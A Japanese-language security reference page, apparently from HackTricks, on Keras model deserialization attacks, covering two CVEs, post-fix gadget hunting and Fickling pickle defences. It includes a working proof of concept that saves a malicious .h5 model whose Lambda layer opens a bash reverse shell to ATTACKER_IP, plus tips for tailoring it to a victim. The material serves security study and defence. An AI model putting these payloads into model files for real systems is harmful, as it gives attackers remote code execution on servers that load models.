# Keras Model Deserialization RCE と Gadget Hunting

このページでは、Keras model deserialization pipeline に対する実践的な exploitation techniques を要約し、native .keras format の内部構造と attack surface を説明するとともに、Model File Vulnerabilities (MFVs) および post-fix gadgets を見つけるための researcher toolkit を提供します。

## .keras model format の内部構造

A .keras file は、少なくとも以下を含む ZIP archive です:<sup>[[1]](#references)</sup>
- metadata.json – 一般的な情報（例: Keras version）
- config.json – model architecture（primary attack surface）
- model.weights.h5 – HDF5 内の weights

config.json は recursive deserialization を制御します。Keras は modules を import し、classes/functions を解決して、attacker-controlled dictionaries から layers/objects を再構築します。<sup>[[1]](#references)</sup>

Dense layer object の snippet 例:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization は以下を実行します:<sup>[[1]](#references)</sup>
- module/class_name keys からの module import と symbol resolution
- 攻撃者が制御する kwargs を使用した from_config(...) または constructor の呼び出し
- nested objects（activations、initializers、constraints など）への再帰

歴史的に、これは config.json を細工する攻撃者に以下の3つのプリミティブを提供していました:<sup>[[1]](#references)</sup>
- import される modules の制御
- 解決される classes/functions の制御
- constructors/from_config に渡される kwargs の制御

## CVE-2024-3660 – Lambda-layer bytecode RCE

根本原因:
- Legacy Lambda deserialization は、攻撃者が制御する marshaled code から Python function を再構築していました。`func_load()` は payload を base64-decode し、`marshal.loads()` を呼び出して `FunctionType` を作成します。Lambda が invoke されると、結果として生成された function の bytecode が実行されます。また、影響を受ける pre-2.13 loaders は legacy formats に対する safe-mode checks を強制していませんでした。<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

native Keras v3 archive では、Lambda function は `__lambda__` object として表現され、その `code` field には base64-encoded marshaled code が含まれます:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
緩和策:
- Keras は native Keras v3 format に対して、デフォルトで `safe_mode=True` を強制します。`Lambda` 内の serialized Python lambdas は、ユーザーが `safe_mode=False` を明示的に指定して opt out しない限りブロックされます。この保護は、legacy formats には同じ形では適用されません。<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

注記:
- Legacy formats（古い HDF5 saves）や古い codebases では、modern checks が適用されない場合があります。そのため、被害者が古い loaders を使用している場合は、「downgrade」形式の攻撃が依然として成立する可能性があります。

## CVE-2025-1550 – Keras 3.0.0–3.8.x における任意の module import

根本原因:
- `_retrieve_class_or_fn` は、`config.json` に含まれる attacker-controlled な module strings に対して `importlib.import_module(module)` を使用していました。
- 影響: 細工された `.keras` archive により、`Model.load_model()` は attacker-selected な Python modules と functions を import できます。これにより、`safe_mode=True` であっても、import-time side effects および attacker-controlled arguments が実行される可能性があります。<sup>[[1]](#references)[[4]](#references)</sup>

攻撃アイデア:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: import は公式 ecosystem modules に制限: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True により unsafe な Lambda serialized-function の読み込みをブロック
- Basic type checking: deserialized objects は想定された型と一致する必要がある

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Legacy TensorFlow-Keras deployments では、HDF5 model files (`.h5`) が引き続き受け入れられる場合があります。攻撃者が、サーバーによって後から読み込まれるか inference に使用される model を upload できる場合、影響を受ける loader は、攻撃者が制御する Python を含む Lambda layer を deserialize でき、その Python がアプリケーションの model workflow 内で実行される可能性があります。<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

target が model を呼び出した際に Lambda が reverse shell を実行する悪意のある .h5 を作成するための最小限の PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
注意事項と信頼性に関するヒント:
- Trigger point は format と workflow によって異なります。参照された write-up では、prediction 中に payload が 2 回 execute されることが確認されています。side effect は繰り返し発生するものとして扱い、payload は idempotent にしてください。<sup>[[7]](#references)</sup>
- Version pinning: serialization mismatch を避けるため、被害者の TF/Keras/Python に合わせてください。たとえば、target が使用している環境が Python 3.8 と TensorFlow 2.13.1 であれば、その環境で artifact を build します。<sup>[[7]](#references)</sup>
- Quick environment replication:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- 検証: `os.system("ping -c 1 YOUR_IP")` のような無害な payload は、reverse shell に切り替える前に実行を確認するのに役立ちます（例: `tcpdump` で ICMP を観測）。<sup>[[7]](#references)</sup>

## allowlist 内の修正後の gadget surface

Keras module allowlist と safe mode を使用していても、許可された callable が side effect を引き起こす可能性があります。例えば、`keras.utils.get_file` は URL をダウンロードし、設定された cache location の下に書き込むため、gadget analysis の候補になります。<sup>[[1]](#references)[[19]](#references)</sup>

Candidate Lambda configuration（call signature は管理された test で検証してください）:
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
重要な制限:
- `Lambda.call()` は常に model input を最初の positional argument として渡し、設定された `arguments` を keyword arguments として渡します。`get_file` では、その positional value が `fname` に入るため、tensor/path の不一致によって download 前にこの候補が失敗する可能性があり、確実に動作する gadget ではありません。<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML models 向けの ML pickle import allowlisting (Fickling)

多くの AI/ML model formats (PyTorch `.pt`/`.pth`/`.ckpt`、joblib/scikit-learn artifacts、その他の Python-native formats) には、Python pickle data が埋め込まれています。上記の legacy Keras Lambda path は代わりに marshaled function bytecode を使用するため、別個の deserialization risk です。Pickle opcodes は deserialization 中に attacker-controlled behavior を呼び出す可能性があり、model tampering や RCE につながります。また、単純な scanner では新規または未登録の dangerous imports を見逃す可能性があります。<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

実用的な fail-closed defense は、Python の pickle deserializer に hook を設定し、unpickling 中にレビュー済みの harmless な ML-related imports のみを許可することです。Trail of Bits の Fickling はこの policy を実装しており、数千件の public Hugging Face pickles から構築された curated ML import allowlist を備えています。<sup>[[8]](#references)[[13]](#references)</sup>

“safe” imports の security model (research と実務から抽出した直観): pickle が使用する imported symbols は、以下をすべて同時に満たす必要があります:<sup>[[8]](#references)</sup>
- code を実行したり、実行を引き起こしたりしない (compiled/source code objects、shelling out、hooks などを含まない)
- 任意の attributes や items を get/set しない
- pickle VM から他の Python objects への references を import または取得しない
- secondary deserializers (marshal、nested pickle など) を、間接的な方法も含めて trigger しない

process startup の可能な限り早い段階で Fickling の protections を有効にし、frameworks (torch.load、joblib.load など) が実行する pickle loads がすべてチェックされるようにします:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
運用上のヒント:
- 必要に応じて hooks を一時的に無効化/再有効化できます:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 既知の安全なモデルがブロックされた場合は、シンボルを確認したうえで環境の allowlist を拡張します。<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- より細かな制御が必要な場合、Fickling は汎用的な runtime guard も提供します:<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()` は、すべての `pickle.load()` に対してチェックを強制します
- `with fickling.check_safety():` は、スコープ内での強制に使用します
- `fickling.load(path)` / `fickling.is_likely_safe(path)` は、単発のチェックに使用します

- 可能な場合は、pickle 以外の model format（例: SafeTensors）を優先してください。<sup>[[15]](#references)</sup> pickle を受け入れる必要がある場合は、network egress を無効にした least privilege 環境で loader を実行し、allowlist を適用してください。

この allowlist-first 戦略は、互換性を高く維持しながら、一般的な ML pickle exploit path を確実にブロックします。ToB の benchmark では、Fickling は合成された malicious file の 100% を検出し、主要な Hugging Face repo の clean file の約 99% を許可しました。<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) 許可された module 内での体系的な gadget discovery

keras、keras_nlp、keras_cv、keras_hub 全体で候補となる callable を列挙し、file/network/process/env に対する side effect を持つものを優先します。<sup>[[1]](#references)</sup>

<details>
<summary>allowlist に登録された Keras module 内で危険な可能性のある callable を列挙する</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) 直接 deserialization testing（.keras archive は不要）

crafted dicts を Keras deserializers に直接渡し、受け入れられる params を確認して side effects を観察します。<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-version probing と formats

Keras には、異なる guardrails と formats を持つ複数の codebase/世代が存在します:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras（legacy、削除予定）
- tf-keras: 別途メンテナンスされている
- Multi-backend Keras 3（official）: native .keras を導入

codebase と formats（.keras と legacy HDF5）を横断してテストを繰り返し、regression や不足している guard を明らかにします。

## References

- [1] [Keras Model Deserialization における Vulnerabilities の調査（huntr blog）](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – serialization に checks を追加](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import（≤ 3.8）](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE から root 取得](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling の新しい AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML environments の Securing（README）](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks の背景](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers による arbitrary code injection](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer source（v3.10.0）](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities source（v3.10.0）](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
